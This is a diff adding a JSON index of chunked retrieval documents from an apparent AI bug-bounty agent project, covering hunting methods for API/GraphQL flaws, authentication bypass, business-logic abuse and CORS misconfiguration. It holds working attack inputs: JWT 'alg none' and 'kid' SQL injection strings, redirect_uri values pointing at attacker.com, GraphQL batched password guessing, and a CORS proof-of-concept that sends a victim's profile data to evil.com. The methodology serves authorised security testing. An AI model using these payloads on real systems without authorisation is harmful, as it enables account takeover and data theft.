@@ -1,0 +1,1522 @@
+{
+  "6774483544395020584": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": "# API & GraphQL — Hunting Methodology\n\n## REST API Specific Testing\n\n### Finding Hidden Endpoints\n\nREST APIs often expose more than their docs reveal:\n\n**Discovery techniques (suggest to user):**\n- JS bundle mining: `grep -r 'api/' bundled.js` — extract all `/api/` paths\n- Common wordlists: `ffuf -u https://target.com/api/FUZZ -w api_wordlist.txt`\n- Swagger/OpenAPI: try `/api/swagger.json`, `/api/openapi.yaml`, `/v1/docs`, `/api-docs`\n- Nginx/Apache misconfig: `/api/`, `/v1/`, `/v2/`, `/internal/` — try all version prefixes\n- Mobile app APK decompile: `apktool d app.apk` → grep strings for endpoints\n- Wayback Machine: `https://web.archive.org/cdx/search/cdx?url=target.com/api/*`\n\n**Versioning bypass:**\n- API has `/v2/users` but also still serves `/v1/users` with old (less-protected) logic\n- Try `/v0/`, `/beta/`, `/internal/`, `/admin/` prefixes alongside versioned endpoints\n\n---\n\n### Broken Object Level Authorization (BOLA / IDOR in APIs)\n\nThe most common and highest-impact REST API vu",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "1841195921809954593": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": " / IDOR in APIs)\n\nThe most common and highest-impact REST API vulnerability. See also `references/vulnerabilities/idor.md`.\n\n**API-specific BOLA targets:**\n```\nGET  /api/v1/users/{user_id}          → change user_id to another\nGET  /api/v1/orders/{order_id}        → access another user's order\nGET  /api/v1/invoices/{invoice_id}    → financial data of other users\nPUT  /api/v1/users/{user_id}/email    → update another user's email\nDEL  /api/v1/posts/{post_id}          → delete another user's post\nGET  /api/v1/admin/users              → unauthenticated admin endpoint\n```\n\n**Testing pattern:**\n1. Account A: make request, note resource ID\n2. Account B: replay same request with Account A's ID\n3. No ownership check → BOLA confirmed\n\n---\n\n### Broken Function Level Authorization (BFLA)\n\nAccessing admin/privileged API functions as a regular user:\n\n**Common targets:**\n```\nPOST /api/v1/admin/users            → create user as non-admin\nDELETE /api/v1/admin/users/{id}     → delete users\nGET /api/v1/a",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "3606516250149244118": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": "DELETE /api/v1/admin/users/{id}     → delete users\nGET /api/v1/admin/audit-logs        → access audit logs\nPUT /api/v1/users/{id}/role         → change someone's role\nPOST /api/v1/admin/impersonate      → impersonate another user\n```\n\n**Testing:** Make admin-level API calls with a regular user JWT. If they succeed → BFLA = **High/Critical**.\n\n---\n\n### Mass Assignment\n\nAPI accepts additional fields in PUT/PATCH that modify privileged properties:\n\n```json\n// Intended request\nPATCH /api/v1/profile\n{\"displayName\": \"Alice\"}\n\n// Attack — add privileged fields\nPATCH /api/v1/profile\n{\"displayName\": \"Alice\", \"role\": \"admin\", \"isVerified\": true, \"creditBalance\": 9999}\n```\n\n**If server accepts extra fields → mass assignment confirmed.** Check if role/permission/balance actually changes.\n\n---\n\n### API Key & Token Exposure\n\n**Common locations to check:**\n- JS bundles: `grep -r 'api_key\\|apiKey\\|Authorization\\|Bearer\\|secret\\|token' app.js`\n- Response headers: `X-API-Key`, `Authorization` in respons",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "3437066616267292066": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": ".js`\n- Response headers: `X-API-Key`, `Authorization` in responses (should never be echoed)\n- Error messages: stack traces may leak keys/tokens\n- Git history: `git log --all -p | grep -i 'api_key\\|secret'`\n- `.env` accessible: `https://target.com/.env` — sometimes publicly accessible\n- Swagger UI: parameters pre-filled with real tokens\n\n---\n\n### Rate Limiting & Quota Bypass\n\nIf an endpoint has per-user rate limits:\n\n- Rotate IPs via headers: `X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `CF-Connecting-IP`\n- Rotate API keys (if multiple accounts)\n- Use different subdomain endpoints (same API, different host rule)\n- Change HTTP method: POST vs GET on same endpoint\n\n---\n\n## GraphQL Specific Testing\n\n### Introspection — First Step Always\n\n**Always try introspection to map the full schema:**\n```graphql\n{ __schema { types { name fields { name type { name } } } } }\n```\n\nIf introspection is disabled in production, try:\n- `{ __type(name: \"User\") { fields { name type { name } } } }`  (single",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "8143369746730376813": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": "type(name: \"User\") { fields { name type { name } } } }`  (single type query)\n- `{ __schema { queryType { name } } }` (minimal check)\n- Introspection via POST with `content-type: application/json` when GET is blocked\n- `IntrospectionQuery` via Altair/GraphiQL playgrounds if exposed at `/graphql`\n\nTools to suggest: **InQL** (Burp extension), **graphql-voyager**, **clairvoyance** (wordlist-based blind introspection)\n\n---\n\n### GraphQL IDOR / Authorization Issues\n\nGraphQL resolvers often miss authorization checks:\n\n```graphql\n# Should only return current user's data — does it enforce this?\n{ user(id: \"ANOTHER_USER_ID\") { email phone creditCard } }\n\n# Mutation that should require ownership\nmutation { deletePost(id: \"OTHER_USER_POST_ID\") { success } }\n\n# Admin-only query accessible to regular users\n{ adminDashboard { totalRevenue userList { email } } }\n```\n\n**Testing:** Run queries with another user's IDs using your token. Check if resolver validates ownership.\n\n---\n\n### GraphQL Batching Atta",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "4600400012436604746": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::5",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": "if resolver validates ownership.\n\n---\n\n### GraphQL Batching Attacks\n\nGraphQL allows batching multiple operations in one request — useful to bypass rate limits:\n\n```json\n[\n  {\"query\": \"mutation { login(email: \\\"admin@target.com\\\", password: \\\"password1\\\") { token } }\"},\n  {\"query\": \"mutation { login(email: \\\"admin@target.com\\\", password: \\\"password2\\\") { token } }\"},\n  ...1000 more...\n]\n```\n\nIf rate limiting is per-HTTP-request (not per-operation) → effectively bypasses brute force protection.\n\nAlso useful for CSRF-less state changes in bulk.\n\n---\n\n### GraphQL Query Depth / Complexity DoS\n\nSome GraphQL APIs have no depth limit:\n\n```graphql\n{ user { friends { friends { friends { friends { friends { id email } } } } } } }\n```\n\nDeeply nested queries can cause exponential server load. **Reportable if it causes measurable service degradation.** Not reportable as a theoretical concern alone.\n\n---\n\n### GraphQL Mutations — Business Logic\n\nCheck all mutations for:\n- **Missing auth on state-chang",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 5,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "8369918453239431104": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::6",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": " Logic\n\nCheck all mutations for:\n- **Missing auth on state-changing mutations** (password change, email update, order placement)\n- **IDOR in mutations**: `deleteUser(id: \"OTHER_ID\")`, `updateProfile(userId: \"OTHER_ID\", ...)`\n- **Race conditions**: Send same mutation 50x in parallel — double-spend, duplicate orders\n- **Type confusion**: Send unexpected types for arguments (array where string expected)\n\n---\n\n### Aliases — WAF/Rate Limit Bypass\n\nGraphQL aliases let you call the same field multiple times under different names:\n\n```graphql\n{\n  res1: user(id: \"1\") { email }\n  res2: user(id: \"2\") { email }\n  res3: user(id: \"3\") { email }\n  ...\n}\n```\n\nOne HTTP request → 100 user records → rate limit effectively bypassed.\n\n---\n\n### GraphQL Injection\n\nIf GraphQL variables are interpolated into strings server-side:\n\n```graphql\nmutation {\n  search(term: \"a\\\") { __typename }\") {\n    results\n  }\n}\n```\n\nTest for SQLi, NoSQLi, and SSTI through GraphQL variable fields, especially in search, filter, and",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 6,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "6086391589028510909": {
+    "chunk_id": "rag\\vulnerabilities\\api-graphql.md::chunk::7",
+    "doc_id": "rag\\vulnerabilities\\api-graphql.md",
+    "text": "rough GraphQL variable fields, especially in search, filter, and sort arguments.\n\n---\n\n## Impact Classification\n\n| API/GraphQL Finding | Severity |\n|---|---|\n| BOLA — any user's sensitive data | High |\n| BFLA — admin functions accessible by users | High/Critical |\n| Mass assignment → role escalation | Critical |\n| GraphQL — admin query accessible | High/Critical |\n| Introspection enabled (alone) | Low/Informational |\n| GraphQL batching → auth bypass | High |\n| API key exposure in JS bundle | Medium/High |\n| Unauthenticated endpoint with sensitive data | High |\n| Rate limit bypass (no sensitive endpoint) | Low |\n\n## Do Not Report\n- Introspection enabled in isolation (informational only — no direct impact)\n- GraphQL field suggestions (`Did you mean X?`) without proved exploitation\n- Theoretical DoS without measurable server degradation\n- API versioning differences without confirmed security regression\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 7,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\api-graphql.md",
+        "mtime": 1775393895.2805498,
+        "size": 7766,
+        "hash": "c944af1b04e19e919215557ec250a7ebef73f55651536ca705bafa149fa31b84"
+      }
+    }
+  },
+  "1905677099413784077": {
+    "chunk_id": "rag\\vulnerabilities\\auth-bypass.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\auth-bypass.md",
+    "text": "# Authentication & Authorization Bypass — Hunting Methodology\n\n## Attack Surface Coverage\n\n| Category | Examples |\n|---|---|\n| JWT vulnerabilities | `alg: none`, weak secret, `kid` injection |\n| OAuth misconfigurations | State param bypass, redirect_uri manipulation, token leakage |\n| Session security | Session fixation, predictable tokens, missing invalidation |\n| Password mechanisms | Reset token predictability, token reuse, race conditions |\n| MFA bypass | Code reuse, response manipulation, rate limit bypass |\n| Privilege escalation | Role parameter manipulation, JWT claim forgery |\n\n## JWT Hunting\n\n**Inspect any JWT (header.payload.signature):**\n\nDecode with: `echo \"PAYLOAD\" | base64 -d`\n\n**Test 1 — Algorithm None:**\nChange header to `{\"alg\":\"none\",\"typ\":\"JWT\"}`, remove signature\nIf accepted → Critical auth bypass\n\n**Test 2 — HS256 with Weak Secret:**\nTry common secrets with `hashcat -a 0 -m 16500 <jwt> /path/to/wordlist`\nIf cracked → can forge any payload\n\n**Test 3 — RS256 to HS25",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\auth-bypass.md",
+        "mtime": 1775393895.2805498,
+        "size": 4441,
+        "hash": "5749b2461717acfab326e100f007d392aa43103fe6f3fda26dcabd772673b0e3"
+      }
+    }
+  },
+  "5074955689556365264": {
+    "chunk_id": "rag\\vulnerabilities\\auth-bypass.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\auth-bypass.md",
+    "text": "st`\nIf cracked → can forge any payload\n\n**Test 3 — RS256 to HS256 Downgrade:**\nChange `alg` from `RS256` to `HS256`, sign with the public key as HMAC secret\nIf accepted → auth bypass (server thinks it's HMAC, signs with the public key)\n\n**Test 4 — `kid` Header Injection:**\n`\"kid\": \"../../dev/null\"` or `\"kid\": \"' UNION SELECT 'attacker-secret'--\"`\nIf server uses `kid` to fetch signing key from DB/filesystem unsafely → SQLi or file path injection\n\n**Test 5 — Sensitive Claims to Modify (are they verified):**\n- `\"role\": \"admin\"` → try escalating role claim\n- `\"user_id\": 1` → try changing to other user ID\n- `\"scope\": \"admin:*\"` → try expanding scopes\n\n## OAuth Hunting\n\n**Test 1 — State Parameter:**\nRemove `state` param or reuse state across requests\nIf CSRF protection via state is absent → OAuth CSRF possible\n\n**Test 2 — redirect_uri Manipulation:**\nOriginal: `redirect_uri=https://app.com/callback`\nTry: `redirect_uri=https://attacker.com`\nTry: `redirect_uri=https://app.com.attacker.com`\nTry",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\auth-bypass.md",
+        "mtime": 1775393895.2805498,
+        "size": 4441,
+        "hash": "5749b2461717acfab326e100f007d392aa43103fe6f3fda26dcabd772673b0e3"
+      }
+    }
+  },
+  "3702149453948058100": {
+    "chunk_id": "rag\\vulnerabilities\\auth-bypass.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\auth-bypass.md",
+    "text": "tacker.com`\nTry: `redirect_uri=https://app.com.attacker.com`\nTry: `redirect_uri=https://app.com/callback/../../../attacker.com`\nIf accepted → authorization code leaks to attacker\n\n**Test 3 — Token Leakage via Referrer:**\nCheck if access token appears in URL parameters and is sent in Referer header to third-party scripts\n\n**Test 4 — Response Type Confusion:**\n`response_type=token` instead of `response_type=code`\nIf implicit grant is enabled and not expected → token returned directly in URL\n\n## Password Reset Hunting\n\n**Test 1 — Token Reuse:**\nRequest reset, use token, request new token\nTry using the first token again → if it still works → no invalidation\n\n**Test 2 — Host Header Injection:**\nAdd `Host: attacker.com` or `X-Forwarded-Host: attacker.com` to reset request\nIf reset email uses Host header to construct link → token sent to attacker-controlled URL\n\n**Test 3 — Race Condition:**\nRequest password reset rapidly in parallel threads\nCheck if multiple valid tokens are generated for the",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\auth-bypass.md",
+        "mtime": 1775393895.2805498,
+        "size": 4441,
+        "hash": "5749b2461717acfab326e100f007d392aa43103fe6f3fda26dcabd772673b0e3"
+      }
+    }
+  },
+  "7817659925951999489": {
+    "chunk_id": "rag\\vulnerabilities\\auth-bypass.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\auth-bypass.md",
+    "text": "lel threads\nCheck if multiple valid tokens are generated for the same timestamp\n\n**Test 4 — Predictable Tokens:**\nObserve multiple reset tokens, check for sequential or time-based patterns\nPRNG-based tokens without cryptographic randomness\n\n## Session Security\n\n**Session Fixation:**\n1. Get session ID without logging in\n2. Provide session ID to victim (craft link)\n3. Victim logs in with this session ID\n4. Session ID remains valid → attacker inherits authenticated session\n\n**Missing Post-Logout Invalidation:**\n1. Log in, capture session token\n2. Log out\n3. Replay session token — if app still accepts it → not invalidated server-side\n\n## MFA Bypass\n\n**Response Manipulation:**\nSend wrong OTP, intercept response showing `{\"verified\": false}`, change to `{\"verified\": true}`\nIf app proceeds → MFA bypassed client-side\n\n**Code Reuse:**\nUse same OTP code twice — if second use succeeds → no replay protection\n\n**Rate Limit Bypass:**\nTry OTP brute force with different IP headers: `X-Forwarded-For`, ",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\auth-bypass.md",
+        "mtime": 1775393895.2805498,
+        "size": 4441,
+        "hash": "5749b2461717acfab326e100f007d392aa43103fe6f3fda26dcabd772673b0e3"
+      }
+    }
+  },
+  "4040675708839806625": {
+    "chunk_id": "rag\\vulnerabilities\\auth-bypass.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\auth-bypass.md",
+    "text": "y OTP brute force with different IP headers: `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP`\n\n## Impact Classification\n\n| Auth Bypass Type | Severity |\n|---|---|\n| Unauthenticated → any admin account | Critical |\n| JWT forgery to escalate role | Critical |\n| Unauthenticated user data access via reset token | High |\n| OAuth code/token theft → ATO | High |\n| MFA bypass on high-value account | High |\n| Session fixation (requires victim interaction) | Medium |\n| Recovery code leakage (non-current) | Medium |\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\auth-bypass.md",
+        "mtime": 1775393895.2805498,
+        "size": 4441,
+        "hash": "5749b2461717acfab326e100f007d392aa43103fe6f3fda26dcabd772673b0e3"
+      }
+    }
+  },
+  "3785159901032834394": {
+    "chunk_id": "rag\\vulnerabilities\\biz-logic.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\biz-logic.md",
+    "text": "# Business Logic — Hunting Methodology\n\nBusiness logic vulnerabilities abuse the application's intended functionality in ways developers didn't anticipate. They require understanding the business workflow, not just payloads.\n\n## High-Value Business Logic Areas\n\n| Area | What to Test |\n|---|---|\n| Pricing / Checkout | Price manipulation, negative quantities, coupon stacking |\n| Workflow enforcement | Skipping required steps in multi-step flows |\n| Race conditions | Double-spend, duplicate account creation, coupon reuse |\n| Limit bypass | Rate limits, API quotas, subscription tier bypasses |\n| Referral/reward abuse | Self-referral, circular referrals, credit multiplication |\n| Account actions | Mass account creation, email enumeration, permission abuse |\n\n## Price / Checkout Manipulation\n\n**Test 1 — Negative Quantity:**\n`{\"quantity\": -1, \"item_id\": \"ABC\"}` in cart API\nIf server calculates `price * quantity` and doesn't validate → negative total\n\n**Test 2 — Price Parameter Tampering:**\nIn",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\biz-logic.md",
+        "mtime": 1775393895.2815504,
+        "size": 4544,
+        "hash": "a3b29613c3fd712ed3b0d2e48c593e73d0e4c3847aa94b4ee956dc359d858d6f"
+      }
+    }
+  },
+  "6100464642563106728": {
+    "chunk_id": "rag\\vulnerabilities\\biz-logic.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\biz-logic.md",
+    "text": "ate → negative total\n\n**Test 2 — Price Parameter Tampering:**\nIntercept cart update request, change `price` field directly\nIf server trusts client-provided price → price set to $0.01\n\n**Test 3 — Integer Overflow:**\nVery large quantities may overflow to negative numbers\n`\"quantity\": 9999999999`\n\n**Test 4 — Coupon Stacking:**\nApply same coupon code multiple times in one order\nApply multiple single-use coupons in parallel (race)\n\n**Test 5 — Free Items:**\nRemove specific items from order after discount applies\nAdd/remove items to make total < 0 or free\n\n## Workflow / Step Bypass\n\nMulti-step processes (checkout, KYC, email verification, quiz):\n1. Start the flow, intercept state token at step 1\n2. Jump directly to the final step endpoint with state token from step 1\n3. Does the server enforce sequential completion?\n\n**Also check:**\n- Can you place an order without completing payment?\n- Can you access premium content before subscription confirmed?\n- Can you skip identity verification?\n- Can y",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\biz-logic.md",
+        "mtime": 1775393895.2815504,
+        "size": 4544,
+        "hash": "a3b29613c3fd712ed3b0d2e48c593e73d0e4c3847aa94b4ee956dc359d858d6f"
+      }
+    }
+  },
+  "2181619193221296744": {
+    "chunk_id": "rag\\vulnerabilities\\biz-logic.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\biz-logic.md",
+    "text": "ription confirmed?\n- Can you skip identity verification?\n- Can you change email without confirming old email?\n\n## Race Conditions\n\n**Target:** Any operation that should only succeed once but might be exploitable via parallel requests.\n\n*Common targets:*\n- One-time coupon codes\n- Free trial activation (one per account/email)\n- Limited quantity items\n- Currency transfers\n- Referral bonus credit\n\n**Exploitation method (suggest to user):**\nSend 20-50 identical requests simultaneously using tools like `turbo intruder` or `ffuf` with `--rate 0` and parallel connections.\n\nIf server doesn't use database-level locking:\n- Multiple successful redemptions of single-use coupon → free credits\n- Double credit on transfer → duplication\n\n**Confirm with two accounts:** Apply coupon in parallel from both → check if both receive discount.\n\n## Tier / Subscription Bypass\n\n- Sign up for free tier, explore what API endpoints are called for paid features\n- Call paid-feature API endpoints directly with free-tie",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\biz-logic.md",
+        "mtime": 1775393895.2815504,
+        "size": 4544,
+        "hash": "a3b29613c3fd712ed3b0d2e48c593e73d0e4c3847aa94b4ee956dc359d858d6f"
+      }
+    }
+  },
+  "3116077197666689107": {
+    "chunk_id": "rag\\vulnerabilities\\biz-logic.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\biz-logic.md",
+    "text": "eatures\n- Call paid-feature API endpoints directly with free-tier token\n- Check if server enforces tier via JWT claim that can be modified (see auth-bypass.md)\n- Downgrade account after accessing paid content — confirm content access is revoked\n\n## Referral / Reward Abuse\n\n- Self-referral: use your own referral link to sign up with secondary email\n- Circular: A refers B, B refers A → infinite loop\n- Apply referral after purchase (timing bypass)\n- Referral credit without full signup completion by referred user\n\n## Limit Bypass Techniques\n\nIf per-account limits exist, test:\n- Same action with different user accounts (is limit per-user or per-session?)\n- Same action with different IPs (`X-Forwarded-For` header rotation)\n- Resetting count by deleting and re-creating items\n- Parallel requests before server updates count\n\n## Impact Classification\n\n| Business Logic Bug | Severity |\n|---|---|\n| Price manipulation → free/negative price | High/Critical |\n| Race condition on payment → double cred",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 3,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\biz-logic.md",
+        "mtime": 1775393895.2815504,
+        "size": 4544,
+        "hash": "a3b29613c3fd712ed3b0d2e48c593e73d0e4c3847aa94b4ee956dc359d858d6f"
+      }
+    }
+  },
+  "682937633889361098": {
+    "chunk_id": "rag\\vulnerabilities\\biz-logic.md::chunk::4",
+    "doc_id": "rag\\vulnerabilities\\biz-logic.md",
+    "text": "rice | High/Critical |\n| Race condition on payment → double credit | High |\n| Workflow bypass → access without payment | High |\n| Coupon reuse / stacking | Medium/High |\n| Tier bypass → premium content free | Medium/High |\n| Self-referral Credit Abuse | Medium |\n| Rate limit bypass (without exploitable action) | Low |\n\n## Reportability Criteria\n\nBusiness logic bugs MUST demonstrate:\n1. Concrete financial or data loss beyond theoretical\n2. Working reproduction (exact requests showing unexpected outcome)\n3. The application's intended behavior (what SHOULD happen) vs what DOES happen\n4. Not just a UX inconvenience — actual security/business impact\n",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 4,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\biz-logic.md",
+        "mtime": 1775393895.2815504,
+        "size": 4544,
+        "hash": "a3b29613c3fd712ed3b0d2e48c593e73d0e4c3847aa94b4ee956dc359d858d6f"
+      }
+    }
+  },
+  "2888540888583733829": {
+    "chunk_id": "rag\\vulnerabilities\\cors.md::chunk::0",
+    "doc_id": "rag\\vulnerabilities\\cors.md",
+    "text": "# CORS Misconfiguration — Hunting Methodology\n\n## What Is CORS\n\nCross-Origin Resource Sharing (CORS) controls which origins can read responses from another origin. A misconfigured CORS policy on an authenticated API allows an attacker's website to make credentialed requests on behalf of a logged-in victim and **read the response** — bypassing the Same-Origin Policy.\n\n> **Key distinction from CSRF:** CSRF sends requests without reading the response. CORS misconfig allows the attacker to **READ sensitive response data**.\n\n---\n\n## Finding CORS Entry Points\n\nEvery authenticated API endpoint is a potential CORS target. Priority targets:\n- `/api/user/profile` — PII exfiltration\n- `/api/account/settings` — email, phone, payment info\n- `/api/admin/*` — admin-level data\n- `/api/tokens` or `/api/keys` — API keys, session tokens\n- Any endpoint returning sensitive JSON\n\n---\n\n## Detection: Test Origin Reflection\n\n**Step 1 — Send an arbitrary Origin header and check if it's reflected:**\n\n```http\nGET",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 0,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\cors.md",
+        "mtime": 1775393895.2815504,
+        "size": 4461,
+        "hash": "288437bbc41a9ae2080833e917e568190e17b8e1540b6a3605a7aa9069a0b28e"
+      }
+    }
+  },
+  "4477850762455615036": {
+    "chunk_id": "rag\\vulnerabilities\\cors.md::chunk::1",
+    "doc_id": "rag\\vulnerabilities\\cors.md",
+    "text": "itrary Origin header and check if it's reflected:**\n\n```http\nGET /api/v1/user/profile HTTP/1.1\nHost: target.com\nOrigin: https://evil.com\nCookie: session=<valid_session>\n```\n\n**Vulnerable response:**\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\n```\n\n→ **Both headers together = Critical CORS misconfiguration.** Attacker can read response from evil.com with victim's credentials.\n\n**Step 2 — Test `null` origin (sandbox iframes):**\n```http\nOrigin: null\n```\nIf response includes `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` → exploitable via sandboxed iframe.\n\n**Step 3 — Test subdomain confusion:**\n```http\nOrigin: https://evil.target.com\nOrigin: https://target.com.evil.com\nOrigin: https://notreallytarget.com\n```\nCheck if the wildcard check is done incorrectly (e.g., `endsWith('target.com')` without anchoring).\n\n---\n\n## CORS Misconfiguration Patterns\n\n| Pattern | Exploitable? |\n|---|---|\n| `ACAO: *",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 1,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\cors.md",
+        "mtime": 1775393895.2815504,
+        "size": 4461,
+        "hash": "288437bbc41a9ae2080833e917e568190e17b8e1540b6a3605a7aa9069a0b28e"
+      }
+    }
+  },
+  "5767474370892331866": {
+    "chunk_id": "rag\\vulnerabilities\\cors.md::chunk::2",
+    "doc_id": "rag\\vulnerabilities\\cors.md",
+    "text": "ration Patterns\n\n| Pattern | Exploitable? |\n|---|---|\n| `ACAO: *` (wildcard) | ❌ NOT exploitable — credentials not sent with wildcard |\n| `ACAO: https://evil.com` + `ACAC: true` | ✅ **Critical** — full credential read |\n| `ACAO: null` + `ACAC: true` | ✅ **High** — via sandboxed iframe |\n| `ACAO: https://evil.target.com` + `ACAC: true` | ✅ **High** — if attacker controls subdomain |\n| `ACAO: *` without `ACAC` | ❌ Only useful for unauthenticated data |\n| Origin not reflected, fixed trusted list | ❌ Not exploitable |\n| `ACAO: https://trusted.com` (fixed, not reflected) | ❌ Not exploitable unless you control trusted.com |\n\n---\n\n## Exploit Proof of Concept\n\nFor a confirmed `ACAO: evil.com` + `ACAC: true`, provide this PoC HTML:\n\n```html\n<html>\n<body>\n<script>\nfetch('https://target.com/api/v1/user/profile', {\n  credentials: 'include'\n})\n.then(r => r.json())\n.then(data => {\n  fetch('https://evil.com/steal?d=' + JSON.stringify(data));\n});\n</script>\n</body>\n</html>\n```\n\n**Victim visits evil.com",
+    "meta": {
+      "type": "text",
+      "level": 0,
+      "position": 2,
+      "doc_meta": {
+        "path": "F:\\agent\\pikaqiu\\src\\rag\\vulnerabilities\\cors.md",
+        "mtime": 1775393895.2815504,
+        "size": 4461,
+        "hash": "288437bbc41a9ae2080833e917e568190e17b8e1540b6a3605a7aa9069a0b28e"
+      }
+    }
+  },
+  "3118636015299814027": {
+    "chunk_id": "rag\\vulnerabilities\\cors.md::chunk::3",
+    "doc_id": "rag\\vulnerabilities\\cors.md",
